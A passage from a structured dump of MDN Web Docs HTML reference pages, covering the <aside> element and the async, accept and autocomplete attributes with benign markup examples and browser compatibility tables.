  description: "# \\<aside\\>: The Aside element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Faside&level=high)\n\nThe `<aside>` [HTML](../index) element represents a portion of a document whose content is only indirectly related to the document's main content. Asides are frequently presented as sidebars or call-out boxes.\n\n## Try it\n\n#### HTML Demo: \\<aside\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>\n      Salamanders are a group of amphibians with a lizard-like appearance, including short legs and a tail in both larval\n      and adult forms.\n    </p>\n\n    <aside>\n      <p>The Rough-skinned Newt defends itself with a deadly neurotoxin.</p>\n    </aside>\n\n    <p>\n      Several species of salamander inhabit the temperate rainforest of the Pacific Northwest, including the Ensatina, the\n      Northwestern Salamander and the Rough-skinned Newt. Most salamanders are nocturnal, and hunt for insects, worms and\n      other small creatures.\n    </p>\n\n    aside {\n      width: 40%;\n      padding-left: 0.5rem;\n      margin-left: 0.5rem;\n      float: right;\n      box-shadow: inset 5px 0 5px -5px #29627e;\n      font-style: italic;\n      color: #29627e;\n    }\n\n    aside > p {\n      margin: 0.5rem;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Usage notes\n\n- Do not use the `<aside>` element to tag parenthesized text, as this kind of text is considered part of the main flow.\n\n## Examples\n\n### Using \\<aside\\>\n\nThis example uses `<aside>` to mark up a paragraph in an article. The paragraph is only indirectly related to the main article content:\n\nhtml\n\n```\n<article>\n  <p>\n    The Disney movie <cite>The Little Mermaid</cite> was first released to\n    theatres in 1989.\n  </p>\n  <aside>\n    <p>The movie earned $87 million during its initial release.</p>\n  </aside>\n  <p>More info about the movie…</p>\n</article>\n```\n\n#### Result\n\n## Technical summary\n\n|                                             ||\n|---------------------------------------------||\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [sectioning content](../content_categories#sectioning_content), [palpable content](../content_categories#palpable_content).                                                                                                                                                                                                                                                                                                                                                                                                          |\n| Permitted content                           | [Flow content](../content_categories#flow_content|\n| Tag omission                                | None, both the starting and ending tag are mandatory|\n| Permitted parents                           | Any element that accepts [flow content](../content_categories#flow_content). Note that an `<aside>` element must not be a descendant of an [`<address>`](address) element.                                                                                                                                                                                                                                                                                                                                                                                                               |\n| Implicit ARIA role                          | [`complementary`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/complementary_role)                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |\n| Permitted ARIA roles                        | [`feed`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/feed_role), [`none`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/none_role), [`note`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/note_role), [`presentation`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/presentation_role), [`region`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/region_role), [`search`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/search_role) |\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|         | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|---------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|         | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `aside` | 5       | 12   | 4       | 11.1  | 5      | 18             | 4                   | 11.1          | 4.2           | 1.0              | 4.4             |     |\n\n## See also\n\n- Other section-related elements: [`<body>`](body), [`<article>`](article), [`<section>`](section), [`<nav>`](nav), [h1](heading_elements), [h2](heading_elements), [h3](heading_elements), [h4](heading_elements), [h5](heading_elements), [h6](heading_elements), [`<hgroup>`](hgroup), [`<header>`](header), [`<footer>`](footer), [`<address>`](address);\n- [Using HTML sections and outlines](heading_elements)\n- [ARIA: Complementary role](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/complementary_role)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/aside](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/aside)"
- name: async (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`async`](element/script#async)

    [`<script>`](element/script)

    Executes the script asynchronously.
- name: Attributes
  summary: Elements in HTML have attributes; these are additional values that configure the elements or adjust their behavior in various ways to meet the criteria the users want
  description: "# HTML attribute reference\n\nElements in HTML have **attributes**; these are additional values that configure the elements or adjust their behavior in various ways to meet the criteria the users want.\n\n## Attribute list\n\n[TABLE]\n\n## Content versus IDL attributes\n\nIn HTML, most attributes have two faces: the **content attribute** and the **IDL (Interface Definition Language) attribute**.\n\nThe content attribute is the attribute as you set it from the content (the HTML code) and you can set it or get it via [`element.setAttribute()`](https://developer.mozilla.org/en-US/docs/Web/API/Element/setAttribute) or [`element.getAttribute()`](https://developer.mozilla.org/en-US/docs/Web/API/Element/getAttribute). The content attribute is always a string even when the expected value should be an integer. For example, to set an [`<input>`](element/input) element's `maxlength` to 42 using the content attribute, you have to call `setAttribute(\"maxlength\", \"42\")` on that element.\n\nThe IDL attribute is also known as a JavaScript property. These are the attributes you can read or set using JavaScript properties like `element.foo`. The IDL attribute is always going to use (but might transform) the underlying content attribute to return a value when you get it and is going to save something in the content attribute when you set it. In other words, the IDL attributes, in essence, reflect the content attributes.\n\nMost of the time, IDL attributes will return their values as they are really used. For example, the default `type` for [`<input>`](element/input) elements is \"text\", so if you set `input.type=\"foobar\"`, the `<input>` element will be of type text (in the appearance and the behavior) but the \"type\" content attribute's value will be \"foobar\". However, the `type` IDL attribute will return the string \"text\".\n\nIDL attributes are not always strings; for example, `input.maxlength` is a number (a signed long). When using IDL attributes, you read or set values of the desired type, so `input.maxlength` is always going to return a number and when you set `input.maxlength`, it wants a number. If you pass another type, it is automatically converted to a number as specified by the standard JavaScript rules for type conversion.\n\nIDL attributes can [reflect other types](https://html.spec.whatwg.org/multipage/urls-and-fetching.html) such as unsigned long, URLs, booleans, etc. Unfortunately, there are no clear rules and the way IDL attributes behave in conjunction with their corresponding content attributes depends on the attribute. Most of the time, it will follow [the rules laid out in the specification](https://html.spec.whatwg.org/multipage/urls-and-fetching.html), but sometimes it doesn't. HTML specifications try to make this as developer-friendly as possible, but for various reasons (mostly historical), some attributes behave oddly (`select.size`, for example) and you should read the specifications to understand how exactly they behave.\n\n## Boolean Attributes\n\nSome content attributes (e.g. `required`, `readonly`, `disabled`) are called [boolean attributes](https://html.spec.whatwg.org/multipage/common-microsyntaxes.html#boolean-attributes). If a boolean attribute is present, its value is **true**, and if it's absent, its value is **false**.\n\nHTML defines restrictions on the allowed values of boolean attributes: If the attribute is present, its value must either be the empty string (equivalently, the attribute may have an unassigned value), or a value that is an ASCII case-insensitive match for the attribute's canonical name, with no leading or trailing whitespace. The following examples are valid ways to mark up a boolean attribute:\n\nhtml\n\n```\n<div itemscope>This is valid HTML but invalid XML.</div>\n<div itemscope=itemscope>This is also valid HTML but invalid XML.</div>\n<div itemscope=\"\">This is valid HTML and also valid XML.</div>\n<div itemscope=\"itemscope\">\n  This is also valid HTML and XML, but perhaps a bit verbose.\n</div>\n```\n\nTo be clear, the values \"`true`\" and \"`false`\" are not allowed on boolean attributes. To represent a false value, the attribute has to be omitted altogether. This restriction clears up some common misunderstandings: With `checked=\"false\"` for example, the element's `checked` attribute would be interpreted as **true** because the attribute is present.\n\n## Event handler attributes\n\n**Warning:** The use of event handler content attributes is discouraged. The mix of HTML and JavaScript often produces unmaintainable code, and the execution of event handler attributes may also be blocked by content security policies.\n\nIn addition to the attributes listed in the table above, global [event handlers](https://developer.mozilla.org/en-US/docs/Web/Events/Event_handlers#using_onevent_properties) — such as [`onclick`](https://developer.mozilla.org/en-US/docs/Web/API/Element/click_event) — can also be specified as [content attributes](#content_versus_idl_attributes) on all elements.\n\nAll event handler attributes accept a string. The string will be used to synthesize a [JavaScript function](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions) like `function name(/*args*/) {body}`, where `name` is the attribute's name, and `body` is the attribute's value. The handler receives the same parameters as its JavaScript event handler counterpart — most handlers receive only one `event` parameter, while `onerror` receives five: `event`, `source`, `lineno`, `colno`, `error`. This means you can, in general, use the `event` variable within the attribute.\n\nhtml\n\n```\n<div onclick=\"console.log(event)\">Click me!</div>\n<!-- The synthesized handler has a name; you can reference itself -->\n<div onclick=\"console.log(onclick)\">Click me!</div>\n```\n\n## See also\n\n- [HTML elements](element)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes)"
- name: Attributes.accept
  summary: The accept attribute takes as its value a comma-separated list of one or more file types, or unique file type specifiers, describing which file types to allow
  description: "# HTML attribute: accept\n\nThe `accept` attribute takes as its value a comma-separated list of one or more file types, or [unique file type specifiers](#unique_file_type_specifiers), describing which file types to allow.\n\n## Try it\n\n#### HTML Demo: accept\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <label for=\"movie\">Choose a movie to upload:</label>\n\n    <input type=\"file\" id=\"movie\" name=\"movie\" accept=\"video/*\" />\n\n    <label for=\"poster\">Choose a poster:</label>\n\n    <input type=\"file\" id=\"poster\" name=\"poster\" accept=\"image/png, image/jpeg\" />\n\n    label {\n      display: block;\n      margin-top: 1rem;\n    }\n\n    input {\n      margin-bottom: 1rem;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Overview\n\nThe accept property is an attribute of the [file](../element/input/file) [`<input>`](../element/input) type. It was supported on the [`<form>`](../element/form) element, but was removed in favor of [file](../element/input/file).\n\nBecause a given file type may be identified in more than one manner, it's useful to provide a thorough set of type specifiers when you need files of specific type, or use the wild card to denote a type of any format is acceptable.\n\nFor instance, there are a number of ways Microsoft Word files can be identified, so a site that accepts Word files might use an `<input>` like this:\n\nhtml\n\n```\n<input\n  type=\"file\"\n  id=\"docpicker\"\n  accept=\".doc,.docx,application/msword,application/vnd.openxmlformats-officedocument.wordprocessingml.document\" />\n```\n\nWhereas if you're accepting a media file, you may want to be include any format of that media type:\n\nhtml\n\n```\n<input type=\"file\" id=\"soundFile\" accept=\"audio/*\" />\n<input type=\"file\" id=\"videoFile\" accept=\"video/*\" />\n<input type=\"file\" id=\"imageFile\" accept=\"image/*\" />\n```\n\nThe `accept` attribute doesn't validate the types of the selected files; it provides hints for browsers to guide users towards selecting the correct file types. It is still possible (in most cases) for users to toggle an option in the file chooser that makes it possible to override this and select any file they wish, and then choose incorrect file types.\n\nBecause of this, you should make sure that expected requirement is validated server-side.\n\n## Examples\n\nWhen set on a file input type, the native file picker that opens up should only enable selecting files of the correct file type. Most operating systems lighten the files that don't match the criteria and aren't selectable.\n\nhtml\n\n```\n<p>\n  <label for=\"soundFile\">Select an audio file:</label>\n  <input type=\"file\" id=\"soundFile\" accept=\"audio/*\" />\n</p>\n<p>\n  <label for=\"videoFile\">Select a video file:</label>\n  <input type=\"file\" id=\"videoFile\" accept=\"video/*\" />\n</p>\n<p>\n  <label for=\"imageFile\">Select some images:</label>\n  <input type=\"file\" id=\"imageFile\" accept=\"image/*\" multiple />\n</p>\n```\n\nNote the last example allows you to select multiple images. See the [`multiple`](../element/input#multiple) attribute for more information.\n\n## Unique file type specifiers\n\nA **unique file type specifier** is a string that describes a type of file that may be selected by the user in an [`<input>`](../element/input) element of type `file`. Each unique file type specifier may take one of the following forms:\n\n- A valid case-insensitive filename extension, starting with a period (\".\") character. For example: `.jpg`, `.pdf`, or `.doc`.\n- A valid MIME type string, with no extensions.\n- The string `audio/*` meaning \"any audio file\".\n- The string `video/*` meaning \"any video file\".\n- The string `image/*` meaning \"any image file\".\n\nThe `accept` attribute takes as its value a string containing one or more of these unique file type specifiers, separated by commas. For example, a file picker that needs content that can be presented as an image, including both standard image formats and PDF files, might look like this:\n\nhtml\n\n```\n<input type=\"file\" accept=\"image/*,.pdf\" />\n```\n\n## Using file inputs\n\n### A basic example\n\nhtml\n\n```\n<form method=\"post\" enctype=\"multipart/form-data\">\n  <div>\n    <label for=\"file\">Choose file to upload</label>\n    <input type=\"file\" id=\"file\" name=\"file\" multiple />\n  </div>\n  <div>\n    <button>Submit</button>\n  </div>\n</form>\n```\n\nThis produces the following output:\n\n**Note:** You can find this example on GitHub too — see the [source code](https://github.com/mdn/learning-area/blob/main/html/forms/file-examples/simple-file.html), and also [see it running live](https://mdn.github.io/learning-area/html/forms/file-examples/simple-file.html).\n\nRegardless of the user's device or operating system, the file input provides a button that opens up a file picker dialog that allows the user to choose a file.\n\nIncluding the [`multiple`](../element/input#multiple) attribute, as shown above, specifies that multiple files can be chosen at once. The user can choose multiple files from the file picker in any way that their chosen platform allows (e.g. by holding down Shift or Control, and then clicking). If you only want the user to choose a single file per `<input>`, omit the `multiple` attribute.\n\n### Limiting accepted file types\n\nOften you won't want the user to be able to pick any arbitrary type of file; instead, you often want them to select files of a specific type or types. For example, if your file input lets users upload a profile picture, you probably want them to select web-compatible image formats, such as [JPEG](https://developer.mozilla.org/en-US/docs/Glossary/JPEG) or [PNG](https://developer.mozilla.org/en-US/docs/Glossary/PNG).\n\nAcceptable file types can be specified with the [`accept`](../element/input/file#accept) attribute, which takes a comma-separated list of allowed file extensions or MIME types. Some examples:\n\n- `accept=\"image/png\"` or `accept=\".png\"` — Accepts PNG files.\n- `accept=\"image/png, image/jpeg\"` or `accept=\".png, .jpg, .jpeg\"` — Accept PNG or JPEG files.\n- `accept=\"image/*\"` — Accept any file with an `image/*` MIME type. (Many mobile devices also let the user take a picture with the camera when this is used.)\n- `accept=\".doc,.docx,.xml,application/msword,application/vnd.openxmlformats-officedocument.wordprocessingml.document\"` — accept anything that smells like an MS Word document.\n\nLet's look at a more complete example:\n\nhtml\n\n```\n<form method=\"post\" enctype=\"multipart/form-data\">\n  <div>\n    <label for=\"profile_pic\">Choose file to upload</label>\n    <input\n      type=\"file\"\n      id=\"profile_pic\"\n      name=\"profile_pic\"\n      accept=\".jpg, .jpeg, .png\" />\n  </div>\n  <div>\n    <button>Submit</button>\n  </div>\n</form>\n```\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|          | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|          | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `accept` | 1       | 12   | 1       | ≤12.1 | 1      | 18             | 4                   | ≤12.1         | 1             | 1.0              | 4.4             |     |\n\n## See also\n\n- [Using files from web applications](https://developer.mozilla.org/en-US/docs/Web/API/File_API/Using_files_from_web_applications)\n- [File API](https://developer.mozilla.org/en-US/docs/Web/API/File)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/accept](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/accept)"
- name: Attributes.autocomplete
  summary: The HTML autocomplete attribute lets web developers specify what if any permission the user agent has to provide automated assistance in filling out form field values, as well as guidance to the browser as to the type of information expected in the field
  description: "# HTML attribute: autocomplete\n\nThe HTML `autocomplete` attribute lets web developers specify what if any permission the [user agent](https://developer.mozilla.org/en-US/docs/Glossary/User_agent) has to provide automated assistance in filling out form field values, as well as guidance to the browser as to the type of information expected in the field.\n\nIt is available on [`<input>`](../element/input) elements that take a text or numeric value as input, [`<textarea>`](../element/textarea) elements, [`<select>`](../element/select) elements, and [`<form>`](../element/form) elements.\n\n## Try it\n\n#### HTML Demo: autocomplete\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <label for=\"firstName\">First Name:</label>\n    <input name=\"firstName\" id=\"firstName\" type=\"text\" autocomplete=\"given-name\" />\n\n    <label for=\"lastName\">Last Name:</label>\n    <input name=\"lastName\" id=\"lastName\" type=\"text\" autocomplete=\"family-name\" />\n\n    <label for=\"email\">Email:</label>\n    <input name=\"email\" id=\"email\" type=\"email\" autocomplete=\"off\" />\n\n    label {\n      display: block;\n      margin-top: 1rem;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Description\n\nThe `autocomplete` attribute provides a hint to the user agent specifying how to, or indeed whether to, prefill a form control. The attribute value is either the keyword `off` or `on`, or an ordered list of space-separated tokens.\n\nhtml\n\n```\n<input autocomplete=\"off\" />\n<input autocomplete=\"on\" />\n<input autocomplete=\"shipping street-address\" />\n<input autocomplete=\"section-user1 billing postal-code\" />\n```\n\nIf an [`<input>`](../element/input), [`<select>`](../element/select) or [`<textarea>`](../element/textarea) element has no `autocomplete` attribute, the browser will use the [`autocomplete` attribute of the element's **owning form**](../element/form#autocomplete). The owning form is either the [`<form>`](../element/form) matching the `id` specified by the [`form`](../element/input#form) attribute of the element (if present) or, more commonly, the `<form>` the element is nested in.\n\n**Note:** In order to provide autocompletion, user-agents might require `<input>`/`<select>`/`<textarea>` elements to:\n\n1.  Have a `name` and/or `id` attribute\n2.  Be descendants of a `<form>` element\n3.  Be owned by a form with a [submit](../element/input/submit) button\n\nIf the same list of tokens is used in more than one form control, the user-agent will autocomplete all occurrences of the same `autocomplete` value with the same data value.\n\nSome tokens may be used more than once with potentially different expected values, such as the `zip-code` token in a form that contains both shipping and billing addresses. Including multiple different tokens in a space-separated list causes the associated form controls to be given unique autocomplete values: in this case, `autocomplete=\"shipping zip-code\"` and `autocomplete=\"billing zip-code\"`.\n\nSome autocomplete values may need to be re-used multiple times. For example, a form may contain multiple shipping addresses and therefore multiple occurrences of `\"shipping zip-code\"` while still expecting different values. To make the autocomplete value unique in these cases, the first token in the space-separated list of tokens can be a `section-*` token, where the token's first eight characters are always the string \"section-\", followed by an alphanumeric string. All form fields given the `section-*` token with the same alphanumeric string belong to the same **named group**.\n\nIf including the `autocomplete` attribute on [hidden](../element/input/hidden) input elements (`<input type=\"hidden\">`), its value must be an ordered list of space-separated tokens; the `on` and `off` keywords are not allowed.\n\nThe source of the suggested values is generally up to the browser; typically values come from past values entered by the user, but they may also come from pre-configured values. For instance, a browser might let the user save their name, address, phone number, and email addresses for autocomplete purposes. The browser may also offer the ability to save encrypted credit card information, for autocompletion following an authentication procedure.\n\n**Note:** The `autocomplete` attribute also controls whether Firefox will — unlike other browsers — [persist the dynamic disabled state and (if applicable) dynamic checkedness](https://stackoverflow.com/questions/5985839/bug-with-firefox-disabled-attribute-of-input-not-resetting-when-refreshing) of an `<input>` element, `<textarea>` element, or entire `<form>` across page loads. The persistence feature is enabled by default. Setting the value of the `autocomplete` attribute to `off` disables this feature. This works even when the `autocomplete` attribute would normally not apply by virtue of its `type`. See [Firefox bug 654072](https://bugzil.la/654072).\n\n## Values\n\nThe attribute value is either the keyword `off` or `on`, or a space-separated `<token-list>` that describes the meaning of the autocompletion value.\n\n[`off`](#off)  \nThe browser is not permitted to automatically enter or select a value for this field. It is possible that the document or application provides its own autocomplete feature, or that security concerns require that the field's value not be automatically entered.\n\n**Note:** In most modern browsers, setting `autocomplete` to \"`off`\" will not prevent a password manager from asking the user if they would like to save username and password information, or from automatically filling in those values in a site's login form. See [Managing autofill for login fields](https://developer.mozilla.org/en-US/docs/Web/Security/Practical_implementation_guides/Turning_off_form_autocompletion#managing_autofill_for_login_fields).\n\n[`on`](#on)  \nThe browser is allowed to automatically complete the input. No guidance is provided as to the type of data expected in the field, so the browser may use its own judgement.\n\n[`<token-list>`](#token-list)  \nAn ordered set of [space-separated tokens](#token_list_tokens) consisting of autofill detail tokens preceded by optional sectioning and either billing or shipping grouping tokens. Phone numbers, email addresses, and messaging protocol tokens are preceded by a token identifying the type of recipient.\n\nSee the [WHATWG Standard](https://html.spec.whatwg.org/multipage/forms.html#autofill) for more detailed information.\n\n### Token list tokens\n\nThe `<token-list>` options include, in order:\n\n1.  [Group naming token](#named_groups)\n2.  [Grouping identifier](#grouping_identifier)\n3.  [Detail tokens](#detail_tokens)\n4.  [Web authorization](#web_authorization_token)\n\n#### Named groups\n\nTo create a named group of form fields, the optional `section-*` token can be used. If present, this token must be the first token in the space-separated list of tokens.\n\n[\"](#sect4)`section-*`\"  \nDefines the name for a group of form controls. A token whose first eight characters are the string \"section-\", case-insensitive, followed by additional characters. All form controls that start with the same token belong to the named group.\n\n#### Grouping identifier\n\nAn optional `shipping` or `billing` grouping identifier\n\n[\"](#sect5)`shipping`\"  \nThe field identified by subsequent tokens is part of the shipping address or contact information\n\n[\"](#sect6)`billing`\"  \nThe field identified by subsequent tokens is part of the billing address or contact information\n\n#### Detail tokens\n\nEach space-separated detail token list includes either a recipient type with digital contact information, in that order, or a space-separated token list of other tokens.\n\n##### Recipient type\n\nThe tokens that identify the type of recipient include:\n\n[\"](#sect7)`home`\"  \nThe contact type identified by subsequent tokens is for contacting the recipient at their residence.\n\n[\"](#sect8)`work`\"  \nThe contact type identified by subsequent tokens is for contacting the recipient at their work.\n\n[\"](#sect9)`mobile`\"  \nThe contact type identified by subsequent tokens is for contacting the recipient regardless of location.\n\n[\"](#sect10)`fax`\"  \nThe recipient identified by subsequent tokens is for a fax machine.\n\n[\"](#sect11)`page`\"  \nThe recipient identified by subsequent tokens is for a pager or beeper.\n\n##### Digital contact tokens\n\nThe token or group of tokens for telephone numbers or a number's component parts, phone extensions, email addresses, or instant messaging protocols.\n\n[\"](#sect12)`tel`\"  \nA full telephone number, including the country code. If you need to break the phone number up into its components, you can use these values for those fields:\n\n[\"](#sect13)`tel-country-code`\"  \nThe country code, such as \"1\" for the United States, Canada, and other areas in North America and parts of the Caribbean.\n\n[\"](#sect14)`tel-national`\"  \nThe entire phone number without the country code component, including a country-internal prefix. For the phone number \"1-855-555-6502\", this field's value would be \"855-555-6502\".\n\n[\"](#sect15)`tel-area-code`\"  \nThe area code, with any country-internal prefix applied if appropriate.\n\n[\"](#sect16)`tel-local`\"  \nThe phone number without the country or area code. This can be split further into two parts, for phone numbers which have an exchange number and then a number within the exchange. For the phone number \"555-6502\", use \"`tel-local-prefix`\" for \"555\" and \"`tel-local-suffix`\" for \"6502\".\n\n[\"](#sect17)`tel-extension`\"  \nA telephone extension code within the phone number, such as a room or suite number in a hotel or an office extension in a company.\n\n[\"](#sect18)`email`\"  \nAn email address.\n\n[\"](#sect19)`impp`\"  \nA URL for an instant messaging protocol endpoint, such as \"xmpp:<username@example.net>\".\n\n##### Other tokens\n\nWhen the form field is not a phone number, email address, or instant messaging protocol, the space-separated list of tokens is not preceded by a contact type:\n\n[\"](#sect20)`name`\"  \nThe field expects the value to be a person's full name. Using \"`name`\" rather than breaking the name down into its components is generally preferred because it avoids dealing with the wide diversity of human names and how they are structured; however, you can use the following `autocomplete` values if you do need to break the name down into its components:\n\n[\"](#sect21)`honorific-prefix`\"  \nThe prefix or title, such as \"Mrs.\", \"Mr.\", \"Miss\", \"Ms.\", \"Dr.\", or \"Mlle.\".\n\n[\"](#sect22)`given-name`\"  \nThe given (or \"first\") name.\n\n[\"](#sect23)`additional-name`\"  \nThe middle name.\n\n[\"](#sect24)`family-name`\"  \nThe family (or \"last\") name.\n\n[\"](#sect25)`honorific-suffix`\"  \nThe suffix, such as \"Jr.\", \"B.Sc.\", \"PhD.\", \"MBASW\", or \"IV\".\n\n[\"](#sect26)`nickname`\"  \nA nickname or handle.\n\n[\"](#sect27)`username`\"  \nA username or account name.\n\n[\"](#sect28)`new-password`\"  \nA new password. When creating a new account or changing passwords, this should be used for an \"Enter your new password\" or \"Confirm new password\" field, as opposed to a general \"Enter your current password\" field that might be present. This may be used by the browser both to avoid accidentally filling in an existing password and to offer assistance in creating a secure password.\n\n[\"](#sect29)`current-password`\"  \nThe user's current password.\n\n[\"](#sect30)`one-time-code`\"  \nA one-time password (OTP) for verifying user identity that is used as an additional factor in a sign-in flow. Most commonly this is a code received via some out-of-channel mechanism, such as SMS, email, or authenticator application.\n\n[\"](#sect31)`organization-title`\"  \nA job title, or the title a person has within an organization, such as \"Senior Technical Writer\", \"President\", or \"Assistant Troop Leader\".\n\n[\"](#sect32)`organization`\"  \nA company or organization name, such as \"Acme Widget Company\" or \"Girl Scouts of America\".\n\n[\"](#sect33)`street-address`\"  \nA street address. This can be multiple lines of text, and should fully identify the location of the address within its second administrative level (typically a city or town), but should not include the city name, ZIP or postal code, or country name.\n\n[\"](#sect34)`address-line1`\", \"`address-line2`\", \"`address-line3`\"  \nEach individual line of the street address. These should only be present if the \"`street-address`\" is not present.\n\n[\"](#sect35)`address-level4`\"  \nThe finest-grained [administrative level](#administrative_levels_in_addresses), in addresses which have four levels.\n\n[\"](#sect36)`address-level3`\"  \nThe third [administrative level](#administrative_levels_in_addresses), in addresses with at least three administrative levels.\n\n[\"](#sect37)`address-level2`\"  \nThe second [administrative level](#administrative_levels_in_addresses), in addresses with at least two of them. In countries with two administrative levels, this would typically be the city, town, village, or other locality in which the address is located.\n\n[\"](#sect38)`address-level1`\"  \nThe first [administrative level](#administrative_levels_in_addresses) in the address. This is typically the province in which the address is located. In the United States, this would be the state. In Switzerland, the canton. In the United Kingdom, the post town.\n\n[\"](#sect39)`country`\"  \nA country or territory code.\n\n[\"](#sect40)`country-name`\"  \nA country or territory name.\n\n[\"](#sect41)`postal-code`\"  \nA postal code (in the United States, this is the ZIP code).\n\n[\"](#sect42)`cc-name`\"  \nThe full name as printed on or associated with a payment instrument such as a credit card. Using a full name field is preferred, typically, over breaking the name into pieces.\n\n[\"](#sect43)`cc-given-name`\"  \nA given (first) name as given on a payment instrument like a credit card.\n\n[\"](#sect44)`cc-additional-name`\"  \nA middle name as given on a payment instrument or credit card.\n\n[\"](#sect45)`cc-family-name`\"  \nA family name, as given on a credit card.\n\n[\"](#sect46)`cc-number`\"  \nA credit card number or other number identifying a payment method, such as an account number.\n\n[\"](#sect47)`cc-exp`\"  \nA payment method expiration date, typically in the form \"MM/YY\" or \"MM/YYYY\".\n\n[\"](#sect48)`cc-exp-month`\"  \nThe month in which the payment method expires.\n\n[\"](#sect49)`cc-exp-year`\"  \nThe year in which the payment method expires.\n\n[\"](#sect50)`cc-csc`\"  \nThe security code for the payment instrument; on credit cards, this is the 3-digit verification number on the back of the card.\n\n[\"](#sect51)`cc-type`\"  \nThe type of payment instrument (such as \"Visa\" or \"Master Card\").\n\n[\"](#sect52)`transaction-currency`\"  \nThe currency in which the transaction is to take place.\n\n[\"](#sect53)`transaction-amount`\"  \nThe amount, given in the currency specified by \"`transaction-currency`\", of the transaction, for a payment form.\n\n[\"](#sect54)`language`\"  \nA preferred language, given as a valid [BCP 47 language tag](https://en.wikipedia.org/wiki/IETF_language_tag).\n\n[\"](#sect55)`bday`\"  \nA birth date, as a full date.\n\n[\"](#sect56)`bday-day`\"  \nThe day of the month of a birth date.\n\n[\"](#sect57)`bday-month`\"  \nThe month of the year of a birth date.\n\n[\"](#sect58)`bday-year`\"  \nThe year of a birth date.\n\n[\"](#sect59)`sex`\"  \nA gender identity (such as \"Female\", \"Fa'afafine\", \"Hijra\", \"Male\", \"Nonbinary\"), as freeform text without newlines.\n\n[\"](#sect60)`url`\"  \nA URL, such as a home page or company website address as appropriate given the context of the other fields in the form.\n\n[\"](#sect61)`photo`\"  \nThe URL of an image representing the person, company, or contact information given in the other fields in the form.\n\n#### Web authorization token\n\nWith [`<input>`](../element/input) and [`<textarea>`](../element/textarea), the `webauthn` token can be included last to indicate the user agent should show public key credentials when the user is interacting with the control.\n\n[\"](#sect62)`webauthn`\"  \nPasskeys generated by the [Web Authentication API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API), as requested by a conditional [`navigator.credentials.get()`](https://developer.mozilla.org/en-US/docs/Web/API/CredentialsContainer/get) call (i.e., one that includes `mediation: 'conditional'`). If included, this is the last token in the space-separated token list. See [Sign in with a passkey through form autofill](https://web.dev/articles/passkey-form-autofill) for more details.\n\n## Examples\n\nhtml\n\n```\n<div>\n  <label for=\"cc-number\">Enter your credit card number</label>\n  <input name=\"cc-number\" id=\"cc-number\" autocomplete=\"off\" />\n</div>\n```\n\n### Administrative levels in addresses\n\nThe four administrative level fields (`address-level1` through `address-level4`) describe the address in terms of increasing levels of precision within the country in which the address is located. Each country has its own system of administrative levels, and may arrange the levels in different orders when addresses are written.\n\n`address-level1` always represents the broadest administrative division; it is the least-specific portion of the address short of the country name.\n\n### Form layout flexibility\n\nGiven that different countries write their address in different ways, with each field in different places within the address, and even different sets and numbers of fields entirely, it can be helpful if, when possible, your site is able to switch to the layout expected by your users when presenting an address entry form, given the country the address is located within.\n\n### Variations\n\nThe way each administrative level is used will vary from country to 